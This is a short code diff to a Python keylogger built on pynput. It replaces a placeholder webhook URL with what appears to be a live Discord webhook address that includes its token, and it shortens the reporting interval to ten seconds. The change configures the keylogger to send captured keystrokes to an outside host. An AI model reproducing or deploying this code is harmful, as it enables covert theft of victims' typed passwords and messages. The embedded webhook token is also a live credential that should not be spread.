@@ -3,8 +3,8 @@ from threading import Timer
 from pynput.keyboard import Listener
 
 
-WEBHOOK_URL = 'your-custom-webhook-url'
-TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds.
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1081801486767497226/H55XtPG_gPjnnTOU1N3dqDkImqtjg3IDSFrt4eezRSMxAdeD8E3SFAOhQ6VNxOzjITyF'
+TIME_INTERVAL = 10  # Amount of time between each report, expressed in seconds.
 
 
 class Keylogger:
